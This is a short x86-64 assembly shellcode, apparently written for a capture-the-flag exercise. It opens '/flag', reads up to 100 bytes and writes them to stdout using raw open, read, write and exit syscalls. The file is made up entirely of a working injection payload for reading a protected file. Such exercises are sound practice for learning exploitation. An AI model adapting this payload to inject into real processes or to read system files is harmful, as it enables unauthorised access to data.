.global _start

_start:
.intel_syntax noprefix
    
    push 0x67616c66
    mov byte ptr [rsp-1], '/'
    sub rsp, 1

    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov al, 2
    syscall


    mov rdi, rax
    mov rsi, rsp
    mov dl, 100
    xor eax, eax
    syscall

    mov dil, 1
    mov al, 1
    syscall

    xor edi, edi
    mov al, 60
    syscall
